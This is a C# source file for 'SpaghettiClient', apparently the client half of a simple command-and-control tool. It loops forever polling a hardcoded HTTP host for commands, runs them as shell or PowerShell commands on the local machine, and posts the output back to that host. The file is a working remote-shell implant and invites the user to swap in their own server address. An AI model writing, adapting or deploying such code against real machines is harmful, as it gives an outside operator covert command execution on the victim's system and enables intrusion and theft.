using System;
using System.IO;

namespace SpaghettiClient
{
    class Program
    {
        static void Main(string[] args)
        {
            string host = "10.200.32.131"; // change the host ip
            int fs_port = 8088; // change the fileserver port

            string url = String.Format("http://{0}/", host);
            string location = Directory.GetCurrentDirectory();
            string sessionid = Guid.NewGuid().ToString();

            Commands commands = new Commands();

            while(true)
            {
                String cmd = Utilities.Get(url, location);
                if (cmd == "terminate")
                {
                    break;
                }
                else if (cmd == "help")
                {
                    Utilities.Post(url, Utilities.PrintHelp());
                }
                else if (cmd == "session")
                {
                    Utilities.Post(url, sessionid);
                }
                else if (cmd.StartsWith("cd ")) 
                {
                    location = commands.ChangeLocation(cmd, location, url);
                }
                else if (cmd.StartsWith("powershell "))
                {
                    string output = commands.RunPSH(cmd, location);
                    Utilities.Post(url, output.ToString());
                }
                else
                {
                    (string output, string error) = commands.RunCMD(cmd, location);

                    output = (error.Length != 0) ? String.Concat("#!#", error) : output;

                    Utilities.Post(url, output);
                }
            }
        }
    }
}
